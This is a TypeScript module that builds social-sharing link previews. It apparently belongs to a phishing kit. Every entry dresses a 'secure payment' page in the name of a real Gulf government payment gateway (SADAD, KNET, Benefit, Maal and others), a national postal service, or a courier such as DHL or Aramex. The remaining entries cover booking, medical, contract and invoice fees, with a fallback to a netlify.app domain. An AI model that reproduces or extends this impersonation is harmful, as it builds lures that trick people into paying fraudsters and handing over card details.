/**
 * Enhanced Company Metadata Mapping
 * Maps each company to their specific OG meta tags for social sharing
 * تحديث ديناميكي للصورة والعنوان والوصف حسب الشركة
 */

export interface CompanyMeta {
  image: string;
  title: string;
  description: string;
}

const companyMetaMap: Record<string, CompanyMeta> = {
  // Government Systems
  gov_sa: {
    image: "/assets/dynamic-identity/sadad_hero.jpg",
    title: "بوابة سداد للمدفوعات الحكومية 🇸🇦",
    description: "نظام المدفوعات الوطني السعودي - سدد رسوم الخدمات الحكومية والفواتير بأمان تام وسهولة عبر بوابة سداد الموحدة ✅"
  },
  gov_ae: {
    image: "/assets/dynamic-identity/jaywan_hero.jpg",
    title: "بوابة جيوان للمدفوعات الإلكترونية 🇦🇪",
    description: "نظام البطاقة الوطنية الإماراتي - سدد فواتيرك وخدماتك الحكومية بأمان عبر منظومة الدفع الوطنية الإماراتية 💳"
  },
  gov_kw: {
    image: "/assets/dynamic-identity/knet_hero.jpg",
    title: "بوابة كي نت للمدفوعات الوطنية 🇰🇼",
    description: "شبكة الكويت الوطنية للمدفوعات الإلكترونية - سدد رسومك الحكومية بأمان وموثوقية عبر بوابة KNET الرسمية 🇰🇼"
  },
  gov_qa: {
    image: "/assets/dynamic-identity/qatar_gov_hero.jpg",
    title: "بوابة قطر للمدفوعات الحكومية 🇶🇦",
    description: "نظام الدفع الإلكتروني الموحد لدولة قطر - سدد جميع مستحقات الخدمات الحكومية بأعلى معايير الأمان 🇶🇦"
  },
  gov_om: {
    image: "/assets/dynamic-identity/maal_hero.jpg",
    title: "بوابة مال للمدفوعات الوطنية 🇴🇲",
    description: "منظومة الدفع الإلكتروني الوطنية لسلطنة عُمان - سداد سريع وآمن لجميع الرسوم والخدمات عبر بوابة مال 🇴🇲"
  },
  gov_bh: {
    image: "/assets/dynamic-identity/benefit_hero.jpg",
    title: "بوابة بنفت للمدفوعات الوطنية 🇧🇭",
    description: "الشبكة الإلكترونية البحرينية للمعاملات المالية - سدد رسومك وخدماتك الحكومية بأمان تام عبر منظومة بنفت 🇧🇭"
  },

  // UAE - الإمارات
  aramex: {
    image: "/og-aramex.jpg",
    title: "دفع آمن - أرامكس للشحن السريع 🚚",
    description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅"
  },
  dhl: {
    image: "/og-dhl.jpg",
    title: "دفع آمن - DHL الشحن العالمي السريع ⚡",
    description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة إلى أي مكان في العالم 🌍"
  },
  fedex: {
    image: "/og-fedex.jpg",
    title: "دفع آمن - FedEx الشحن الدولي الموثوق 📦",
    description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰"
  },
  ups: {
    image: "/og-ups.jpg",
    title: "دفع آمن - UPS للشحن والتوصيل العالمي 🌐",
    description: "UPS - حلول لوجستية متكاملة - أكمل الدفع بأمان للحصول على خدمات شحن عالمية احترافية مع تغطية شاملة وتتبع دقيق 📍"
  },
  empost: {
    image: "/og-empost.jpg",
    title: "دفع آمن - البريد الإماراتي 🇦🇪",
    description: "البريد الإماراتي الرسمي - خدمات بريدية وشحن متميزة - ادفع بأمان واستمتع بخدمات الشحن المحلية والدولية الموثوقة ✨"
  },

  // Saudi Arabia - السعودية
  smsa: {
    image: "/og-smsa.jpg",
    title: "دفع آمن - SMSA Express سمسا إكسبرس 🚛",
    description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦"
  },
  zajil: {
    image: "/og-zajil.jpg",
    title: "دفع آمن - زاجل للشحن السريع 📮",
    description: "زاجل - شحن سريع وموثوق في السعودية - ادفع بأمان واحصل على خدمات توصيل احترافية مع تغطية شاملة لكل المناطق 🇸🇦"
  },
  naqel: {
    image: "/og-naqel.jpg",
    title: "دفع آمن - ناقل إكسبريس للشحن 🚚",
    description: "ناقل إكسبريس - خدمات شحن متطورة - أكمل دفعتك بأمان للحصول على توصيل سريع وآمن لجميع مدن ومناطق المملكة ⚡"
  },
  saudipost: {
    image: "/og-saudipost.jpg",
    title: "دفع آمن - البريد السعودي 🇸🇦",
    description: "البريد السعودي الرسمي - خدمات بريدية وشحن موثوقة - ادفع بأمان واستفد من شبكة التوزيع الأوسع في المملكة 📦"
  },

  // Kuwait - الكويت
  kwpost: {
    image: "/og-kwpost.jpg",
    title: "دفع آمن - البريد الكويتي 🇰🇼",
    description: "البريد الكويتي الرسمي - خدمات بريدية وشحن متميزة - أكمل الدفع بأمان للحصول على خدمات توصيل محلية ودولية موثوقة ✅"
  },

  // Qatar - قطر
  qpost: {
    image: "/og-qpost.jpg",
    title: "دفع آمن - البريد القطري 🇶🇦",
    description: "البريد القطري الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واستمتع بخدمات توصيل سريعة وآمنة في قطر والعالم 🌍"
  },

  // Oman - عمان
  omanpost: {
    image: "/og-omanpost.jpg",
    title: "دفع آمن - البريد العُماني 🇴🇲",
    description: "البريد العُماني الرسمي - خدمات بريدية وشحن موثوقة - أكمل دفعتك بأمان للحصول على خدمات توصيل محلية ودولية متميزة 📮"
  },

  // Bahrain - البحرين
  bahpost: {
    image: "/og-bahpost.jpg",
    title: "دفع آمن - البريد البحريني 🇧🇭",
    description: "البريد البحريني الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واحصل على خدمات توصيل سريعة وموثوقة في البحرين والعالم ✨"
  },

  // Services
  chalets: {
    image: "/assets/dynamic-identity/chalets_image1.svg",
    title: "تأكيد حجز شاليه - دفع آمن 🏠",
    description: "أكمل عملية الدفع بأمان تام لتأكيد حجز شاليهك المفضل - نظام دفع مشفر وموثوق ✅"
  },
  health_links: {
    image: "/assets/dynamic-identity/health_image1.svg",
    title: "تأكيد موعد طبي - دفع آمن 🏥",
    description: "بوابة الحجوزات الطبية الإلكترونية - سدد رسوم الكشف والخدمات الصحية بأمان تام لتأكيد موعدك 🏥"
  },
  contracts: {
    image: "/assets/dynamic-identity/contract_image1.svg",
    title: "توثيق عقد إلكتروني - دفع آمن 📄",
    description: "بوابة العقود والتوثيق الموحدة - أكمل سداد رسوم التوثيق لاعتماد عقدك الإلكتروني قانونياً ⚖️"
  },
  invoices: {
    image: "/assets/dynamic-identity/invoice_image1.svg",
    title: "سداد فاتورة إلكترونية - دفع آمن 🧾",
    description: "مركز سداد الفواتير الموحد - سدد فواتيرك المستحقة بأمان وسرعة عبر منصتنا المشفرة ✅"
  },

  // Default fallback
  default: {
    image: "/og-aramex.jpg",
    title: "دفع آمن - منصة الدفع الموحدة 💳",
    description: "نظام دفع إلكتروني آمن ومحمي بتشفير SSL - أكمل معاملاتك المالية بكل ثقة وأمان مع حماية كاملة لبياناتك 🔒✅"
  }
};

/**
 * Get absolute URL for image
 */
function getAbsoluteImageUrl(imagePath: string): string {
  if (imagePath.startsWith('http')) {
    return imagePath;
  }
  
  const productionDomain = typeof window !== 'undefined'
    ? window.location.origin
    : (import.meta.env.VITE_PRODUCTION_DOMAIN || 'https://sensational-fenglisu-ebbbfb.netlify.app');
  
  return `${productionDomain}${imagePath}`;
}

/**
 * Get company metadata with fallback and absolute URLs
 * @param companyKey - Company identifier (e.g., 'dhl', 'aramex')
 * @returns Company metadata object with absolute image URL
 */
export const getCompanyMeta = (companyKey: string): CompanyMeta => {
  if (!companyKey) {
    const defaultMeta = companyMetaMap.default;
    return {
      ...defaultMeta,
      image: getAbsoluteImageUrl(defaultMeta.image)
    };
  }

  const key = companyKey.toLowerCase();
  const meta = companyMetaMap[key] || companyMetaMap.default;
  
  return {
    ...meta,
    image: getAbsoluteImageUrl(meta.image)
  };
};
